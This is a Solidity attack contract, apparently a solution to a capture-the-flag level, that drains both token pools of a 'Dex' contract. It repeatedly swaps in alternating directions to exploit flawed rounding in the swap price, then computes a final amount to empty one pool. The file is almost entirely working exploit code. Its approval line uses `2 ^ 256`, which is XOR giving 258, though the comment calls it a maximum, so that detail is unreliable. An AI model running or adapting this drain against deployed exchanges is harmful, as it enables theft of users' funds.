// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "./Dex.sol";

contract AttackDex is Ownable {
    Dex public dex;
    address public token1;
    address public token2;

    constructor(address _victim) public {
        dex = Dex(_victim);
        // dex = Dex(createInstance()); For local testing
        token1 = dex.token1();
        token2 = dex.token2();
        dex.approve(address(dex), 2 ^ 256); // approve max amount once
    }

    function attack() public {
        address from = token1;
        address to = token2;
        //until we don't have the entire balance of one token we keep going
        while (
            ERC20(token1).balanceOf(address(dex)) != 0 &&
            ERC20(token2).balanceOf(address(dex)) != 0
        ) {
            //switch the swap direction at each iteration
            from = (from == token1) ? token2 : token1;
            to = (to == token1) ? token2 : token1;
            // how much we want to swap of token from (our entire balance, except for last iteration)
            uint256 amount = dex.balanceOf(from, address(this));
            //how much we will receive from the to token
            uint256 amountReceived = dex.getSwapPrice(from, to, amount);
            // only for the last iteration, if we swap our entire balance of token from the swap will revert since the dex doesn't have enough of token to
            // we need to determine how much to send to empty the other token balance
            if (amountReceived > 110) {
                amount = (amount * 110) / amountReceived; // amount to swap to receive the entire balance of the other token
            }
            dex.swap(from, to, amount);
        }
    }

    // For local testing, calling this function in our attack contract constructor will give us the initial token balance
    // function createInstance() internal returns (address) {
    //     Dex instance = dex;
    //     address _player = address(this);
    //     address instanceAddress = address(instance);

    //     SwappableToken tokenInstance = new SwappableToken(
    //         instanceAddress,
    //         "Token 1",
    //         "TKN1",
    //         110
    //     );
    //     SwappableToken tokenInstanceTwo = new SwappableToken(
    //         instanceAddress,
    //         "Token 2",
    //         "TKN2",
    //         110
    //     );

    //     address tokenInstanceAddress = address(tokenInstance);
    //     address tokenInstanceTwoAddress = address(tokenInstanceTwo);

    //     instance.setTokens(tokenInstanceAddress, tokenInstanceTwoAddress);

    //     tokenInstance.approve(instanceAddress, 100);
    //     tokenInstanceTwo.approve(instanceAddress, 100);

    //     instance.addLiquidity(tokenInstanceAddress, 100);
    //     instance.addLiquidity(tokenInstanceTwoAddress, 100);

    //     tokenInstance.transfer(_player, 10);
    //     tokenInstanceTwo.transfer(_player, 10);

    //     return instanceAddress;
    // }
}
